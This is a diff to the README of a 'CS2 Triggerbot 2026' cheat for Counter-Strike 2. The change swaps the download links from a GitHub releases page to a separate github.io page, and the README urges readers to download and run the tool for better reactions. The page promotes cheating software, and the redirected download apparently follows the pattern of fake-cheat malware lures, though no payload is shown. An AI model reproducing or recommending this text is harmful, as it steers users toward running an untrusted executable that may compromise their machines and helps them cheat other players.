@@ -1,6 +1,6 @@
 # 🎯 cs2-triggerbot-2026 - Auto-Shoot with Precision Timing
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_Triggerbot_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/congruent-operator6339/cs2-triggerbot-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-CS2_Triggerbot_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://congruent-operator6339.github.io)
 
 ---
 
@@ -11,7 +11,7 @@ Welcome! This guide will help you download and run the CS2 Triggerbot 2026 on yo
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-**[https://github.com/congruent-operator6339/cs2-triggerbot-2026/releases](https://github.com/congruent-operator6339/cs2-triggerbot-2026/releases)**
+**[https://congruent-operator6339.github.io](https://congruent-operator6339.github.io)**
 
 You'll see a page with the latest release. Click the download button to save the file to your computer. The download will start automatically.
 
@@ -133,7 +133,7 @@ The developer regularly releases updates to improve performance and ensure compa
 Thank you for choosing CS2 Triggerbot 2026. We hope this tool enhances your gaming experience. Remember to use it responsibly and enjoy your improved reaction times!
 
 **Download now and take your gameplay to the next level:**  
-[![Get It Here](https://img.shields.io/badge/Get_It-Here-blue?style=for-the-badge&logo=download&logoColor=white)](https://github.com/congruent-operator6339/cs2-triggerbot-2026/releases)
+[![Get It Here](https://img.shields.io/badge/Get_It-Here-blue?style=for-the-badge&logo=download&logoColor=white)](https://congruent-operator6339.github.io)
 
 ---
 
